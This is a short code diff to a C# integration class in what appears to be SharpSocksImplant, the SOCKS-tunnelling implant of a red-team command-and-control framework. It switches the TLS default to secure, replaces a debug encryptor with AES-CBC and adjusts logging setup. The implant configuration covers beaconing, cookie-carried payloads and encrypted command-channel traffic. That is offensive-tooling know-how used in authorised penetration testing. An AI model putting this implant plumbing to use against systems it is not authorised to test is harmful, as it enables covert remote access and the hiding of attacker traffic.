@@ -11,9 +11,10 @@ namespace SharpSocksImplant.Integration
     public static class PoshCreateProxy
     {
         public static SocksController CreateSocksController(Uri serverUri, string commandChannelId, string hostHeader, string userAgent, string key, List<string> urlPaths,
-            string sessionCookieName, string payloadCookieName, ushort timeBetweenReads, IWebProxy wbProxy, short beaconTime, IImplantLog implantComms, bool insecureTLS = true)
+            string sessionCookieName, string payloadCookieName, ushort timeBetweenReads, IWebProxy wbProxy, short beaconTime, IImplantLog implantComms, bool insecureTLS = false)
         {
-            var implantLog = implantComms ?? new PoshDefaultImplantComms();
+            // TODO these should be set
+            var implantLog = implantComms ?? new PoshDefaultImplantComms(null, null, null, null);
             var config = new SocksClientConfiguration
             {
                 CommandChannelSessionId = commandChannelId,
@@ -23,7 +24,6 @@ namespace SharpSocksImplant.Integration
                 UseProxy = wbProxy != null,
                 WebProxy = wbProxy,
                 UrlPaths = urlPaths,
-                ImplantComms = implantLog,
                 HostHeader = hostHeader,
                 PayloadCookieName = payloadCookieName,
                 SessionCookieName = sessionCookieName,
@@ -34,7 +34,7 @@ namespace SharpSocksImplant.Integration
                 throw new Exception("Encryption key is null");
             var socksController = new SocksController(config)
             {
-                Encryptor = new DebugSimpleEncryptor(key),
+                Encryptor = new RijndaelCBCCryptor(key),
                 ImplantComms = implantLog
             };
             socksController.Initialize();
